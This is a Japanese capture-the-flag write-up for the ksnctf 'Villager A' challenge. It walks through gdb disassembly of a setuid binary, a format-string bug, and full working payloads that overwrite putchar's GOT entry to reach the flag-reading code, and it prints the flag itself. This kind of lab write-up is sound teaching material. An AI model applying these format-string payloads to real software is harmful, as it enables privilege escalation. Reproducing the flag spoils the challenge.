<!-- TITLE: Villager A -->
<!-- SUBTITLE: A quick summary of Villager A -->

# 問題

[ksnctf: Villager A](https://ksnctf.sweetduet.info/problem/4)

# 解法

```sh
% ssh q4@ctfq.sweetduet.info -p10022 
q4@ctfq.sweetduet.info's password: 
Last login: Sat May  5 09:06:06 2018 from 10.0.2.2
[q4@localhost ~]$ ls -l
total 16
-r--------. 1 q4a  q4a    22  5月 22 02:12 2012 flag.txt
-rwsr-xr-x. 1 q4a  q4a  5857  5月 22 11:21 2012 q4
-rw-r--r--. 1 root root  151  6月  1 04:47 2012 readme.txt
[q4@localhost ~]$ cat /proc/sys/kernel/randomize_va_space 
2
```

ASLRが有効なので、shellcodeをスタックに入れて起動させるタイプの問題ではなさそう

```sh
[q4@localhost ~]$ ./q4
What's your name?
beef
Hi, beef

Do you want the flag?
yes
Do you want the flag?
YES
Do you want the flag?
Y
Do you want the flag?
y
Do you want the flag?
NO
Do you want the flag?
no
I see. Good bye.
[q4@localhost ~]$ 
```

**no**と答えるまで同じ質問を繰り返してくる、RPGのNPCを模したプログラム

```sh
[q4@localhost ~]$ gdb -q ./q4
Reading symbols from /home/q4/q4...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x080485b4 <+0>:	push   ebp
   0x080485b5 <+1>:	mov    ebp,esp
   0x080485b7 <+3>:	and    esp,0xfffffff0
   0x080485ba <+6>:	sub    esp,0x420
   0x080485c0 <+12>:	mov    DWORD PTR [esp],0x80487a4
   0x080485c7 <+19>:	call   0x80484c4 <puts@plt>
   0x080485cc <+24>:	mov    eax,ds:0x8049a04
   0x080485d1 <+29>:	mov    DWORD PTR [esp+0x8],eax
   0x080485d5 <+33>:	mov    DWORD PTR [esp+0x4],0x400
   0x080485dd <+41>:	lea    eax,[esp+0x18]
   0x080485e1 <+45>:	mov    DWORD PTR [esp],eax
   0x080485e4 <+48>:	call   0x8048484 <fgets@plt>
   0x080485e9 <+53>:	mov    DWORD PTR [esp],0x80487b6
   0x080485f0 <+60>:	call   0x80484b4 <printf@plt>
   0x080485f5 <+65>:	lea    eax,[esp+0x18]
   0x080485f9 <+69>:	mov    DWORD PTR [esp],eax
   0x080485fc <+72>:	call   0x80484b4 <printf@plt>
   0x08048601 <+77>:	mov    DWORD PTR [esp],0xa
   0x08048608 <+84>:	call   0x8048474 <putchar@plt>
   0x0804860d <+89>:	mov    DWORD PTR [esp+0x418],0x1
   0x08048618 <+100>:	jmp    0x8048681 <main+205>
   0x0804861a <+102>:	mov    DWORD PTR [esp],0x80487bb
   0x08048621 <+109>:	call   0x80484c4 <puts@plt>
   0x08048626 <+114>:	mov    eax,ds:0x8049a04
   0x0804862b <+119>:	mov    DWORD PTR [esp+0x8],eax
   0x0804862f <+123>:	mov    DWORD PTR [esp+0x4],0x400
   0x08048637 <+131>:	lea    eax,[esp+0x18]
   0x0804863b <+135>:	mov    DWORD PTR [esp],eax
   0x0804863e <+138>:	call   0x8048484 <fgets@plt>
   0x08048643 <+143>:	test   eax,eax
   0x08048645 <+145>:	sete   al
   0x08048648 <+148>:	test   al,al
   0x0804864a <+150>:	je     0x8048656 <main+162>
   0x0804864c <+152>:	mov    eax,0x0
   0x08048651 <+157>:	jmp    0x80486dc <main+296>
   0x08048656 <+162>:	mov    DWORD PTR [esp+0x4],0x80487d1
   0x0804865e <+170>:	lea    eax,[esp+0x18]
   0x08048662 <+174>:	mov    DWORD PTR [esp],eax
   0x08048665 <+177>:	call   0x80484e4 <strcmp@plt>
   0x0804866a <+182>:	test   eax,eax
   0x0804866c <+184>:	jne    0x8048681 <main+205>
   0x0804866e <+186>:	mov    DWORD PTR [esp],0x80487d5
   0x08048675 <+193>:	call   0x80484c4 <puts@plt>
   0x0804867a <+198>:	mov    eax,0x0
   0x0804867f <+203>:	jmp    0x80486dc <main+296>
   0x08048681 <+205>:	mov    eax,DWORD PTR [esp+0x418]
   0x08048688 <+212>:	test   eax,eax
   0x0804868a <+214>:	setne  al
   0x0804868d <+217>:	test   al,al
   0x0804868f <+219>:	jne    0x804861a <main+102>
   0x08048691 <+221>:	mov    DWORD PTR [esp+0x4],0x80487e6
   0x08048699 <+229>:	mov    DWORD PTR [esp],0x80487e8
   0x080486a0 <+236>:	call   0x80484a4 <fopen@plt>
   0x080486a5 <+241>:	mov    DWORD PTR [esp+0x41c],eax
   0x080486ac <+248>:	mov    eax,DWORD PTR [esp+0x41c]
   0x080486b3 <+255>:	mov    DWORD PTR [esp+0x8],eax
   0x080486b7 <+259>:	mov    DWORD PTR [esp+0x4],0x400
   0x080486bf <+267>:	lea    eax,[esp+0x18]
   0x080486c3 <+271>:	mov    DWORD PTR [esp],eax
   0x080486c6 <+274>:	call   0x8048484 <fgets@plt>
   0x080486cb <+279>:	lea    eax,[esp+0x18]
   0x080486cf <+283>:	mov    DWORD PTR [esp],eax
   0x080486d2 <+286>:	call   0x80484b4 <printf@plt>
   0x080486d7 <+291>:	mov    eax,0x0
   0x080486dc <+296>:	leave  
   0x080486dd <+297>:	ret    
End of assembler dump.
```

アセンブリを部分抜粋する

&#8942;

```
	 ⋮
   0x080485c0 <+12>:	mov    DWORD PTR [esp],0x80487a4
   0x080485c7 <+19>:	call   0x80484c4 <puts@plt>
	 ⋮
	 0x080485e9 <+53>:	mov    DWORD PTR [esp],0x80487b6
   0x080485f0 <+60>:	call   0x80484b4 <printf@plt>
	 ⋮
	 0x080485f9 <+69>:	mov    DWORD PTR [esp],eax
   0x080485fc <+72>:	call   0x80484b4 <printf@plt>
   0x08048601 <+77>:	mov    DWORD PTR [esp],0xa
   0x08048608 <+84>:	call   0x8048474 <putchar@plt>
	 ⋮
	 0x0804861a <+102>:	mov    DWORD PTR [esp],0x80487bb
   0x08048621 <+109>:	call   0x80484c4 <puts@plt>
	 ⋮
	 0x08048656 <+162>:	mov    DWORD PTR [esp+0x4],0x80487d1
	 ⋮
	 0x0804866e <+186>:	mov    DWORD PTR [esp],0x80487d5
   0x08048675 <+193>:	call   0x80484c4 <puts@plt>
	 ⋮
	 0x08048691 <+221>:	mov    DWORD PTR [esp+0x4],0x80487e6
   0x08048699 <+229>:	mov    DWORD PTR [esp],0x80487e8
   0x080486a0 <+236>:	call   0x80484a4 <fopen@plt>
	 ⋮
```

## @pltとはなんぞや

TODO
http://tkmr.hatenablog.com/entry/2017/02/28/030528

## 文字列のスタックへの積み込み

*mov*命令でスタックに積まれた文字列らしきものを見ていく
使うコマンドは *x/s* で、*examine string*を表している
例えば`x/s 0x080487a4`なら、0x080487a4 [^5] から始まるバイト列を文字列として認識し、それを**文字列の終端**、すなわち *\x00* （ヌル文字）まで読んで出力する

```gdb
(gdb) x/s 0x080487a4
0x80487a4 <__dso_handle+4>:	 "What's your name?"
(gdb) x/s 0x080487b6
0x80487b6 <__dso_handle+22>:	 "Hi, "
(gdb) x/s 0x080487bb
0x80487bb <__dso_handle+27>:	 "Do you want the flag?"
(gdb) x/s 0x080487d1
0x80487d1 <__dso_handle+49>:	 "no\n"
(gdb) x/s 0x080487d5
0x80487d5 <__dso_handle+53>:	 "I see. Good bye."
(gdb) x/s 0x080487e6
0x80487e6 <__dso_handle+70>:	 "r"
(gdb) x/s 0x080487e8
0x80487e8 <__dso_handle+72>:	 "flag.txt"
```

`0x08048601`の部分はこの後述べる
それぞれの文字列がスタックに積まれ、その直後の関数呼び出しの際の引数となっている
例えば`0x080487a4`から始まる文字列`"What's your name?"`は、`0x080485c7`の命令から`puts`関数の引数となる
もとのCのソースコードでは、おそらくこういった記述なのだろう

```c
puts("What's your name?");
```

`printf`関数にも同様にスタックから引数が渡されていく
`fopen`関数の場合、引数をふたつ取る

```sh
$ man 3 fopen
⋮
SYNOPSIS
       #include <stdio.h>

       FILE *fopen(const char *path, const char *mode);
⋮
```

**うしろの方の引数から**、順番にスタックに積まれるので、最初に`const char *mode`に該当する **"r"** が積まれ、次に`const char *path`に該当する **"flag.txt"** が積まれている
よって、この`fopen`関数ではじめて *flag.txt* を読み込んでいることがわかり、ループの中でぐるぐる回っていても永遠にフラグがとれないことがわかる

さて、残った`0x08048608`での`putchar`だが、この直前に`0xa`がスタックに積まれている
`0x0a`はASCIIコードで**'\n'**、すなわち改行文字であり、ただ改行するためだけにこの命令が行われていることがわかる…


## GOT overwrite

```sh
[q4@localhost ~]$ ./q4 <<< $(python -c 'print "AAAA" + ".%08x"*16')
What's your name?
Hi, AAAA.00000400.004638c0.00000008.00000014.00e6ffc4.41414141.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025

Do you want the flag?
```

から、Format String Bugが存在することがわかる
*AAAA* を0として、6番目に*41414141*が表示されているので、今回のオフセットは6

書き換えるGOTのアドレスは、意味深に設置されていた*putchar@plt*の中

```gdb
(gdb) disas 0x8048474
Dump of assembler code for function putchar@plt:
   0x08048474 <+0>:	jmp    *0x80499e0
   0x0804847a <+6>:	push   $0x8
   0x0804847f <+11>:	jmp    0x8048454
End of assembler dump.
```

*0x80499e0*を書き換える
little-endianなので、**"\xe0\x99\x04\x08"**で表される

書き換え先は、ループを抜け出したいので、`jne`命令のすぐ後のアドレス`0x08048691`

## Exploit

### `%hhn`指定子を使う場合

1byteずつ書き込むので、
**"\xe0\x99\x04\x08\xe1\x99\x04\x08\xe2\x99\x04\x08\xe3\x99\x04\x08"** の4つのアドレスにそれぞれ書き込み


```python
>>> len("\xe0\x99\x04\x08\xe1\x99\x04\x08\xe2\x99\x04\x08\xe3\x99\x04\x08")
16
>>> (0x91 - 16) & 0xff
129
>>> (0x86 - 0x91) & 0xff
245
>>> (0x04 - 0x86) & 0xff
126
>>> (0x08 - 0x04) & 0xff
4
```

これを元に、payloadを構成すると、

```console
[q4@localhost ~]$ ./q4 <<< $(python -c 'print "\xe0\x99\x04\x08\xe1\x99\x04\x08\xe2\x99\x04\x08\xe3\x99\x04\x08" + "%129x%6$hhn%245x%7$hhn%126x%8$hhn%4x%9$hhn"')
What's your name?
Hi, ��������                                                                                                                              400                                                                                                                                                                                                                                               4d08c0                                                                                                                             8  14
FLAG_nwW6eP503Q3QI0zw
```

### `%hn`指定子を使う場合

少し表示する文字が長くなるが、可能
2byteずつ書き込むので
**"\xe0\x99\x04\x08\xe2\x99\x04\x08"**

```python
>>> len("\xe0\x99\x04\x08\xe2\x99\x04\x08")
8
>>> (0x8691 - 8) & 0xffff
34441
>>> (0x0804 - 0x8691) & 0xffff
33139
```

したがって

```console
[q4@localhost ~]$ ./q4 <<< $(python -c 'print "\xe0\x99\x04\x08\xe2\x99\x04\x08" + "%34441x%6$hn%33139x%7$hn"')
Hi, ����
⋮
⋮
⋮
                                                                2dd8c0
FLAG_nwW6eP503Q3QI0zw
```

# おまけ
サーバから外へ行くコネクションは禁止されているが、問題バイナリを密輸（？）できる

```console
[q4@localhost ~]$ hexdump -ve '1/1 "%.2x"' ./q4
```


[^5]: gdbの出力では `0x80487a4` だが、32bitアドレス空間は4byte （= 1word）として表されるので、先頭の*0*を省略せず書いた（個人の好み）
[^10]: ここで出力される文字列は、 その命令の1つ前の*mov*命令から、`(gdb) x/s 0x080487d5` &rarr; `0x80487d5 <__dso_handle+53>:	 "I see. Good bye."`とわかる
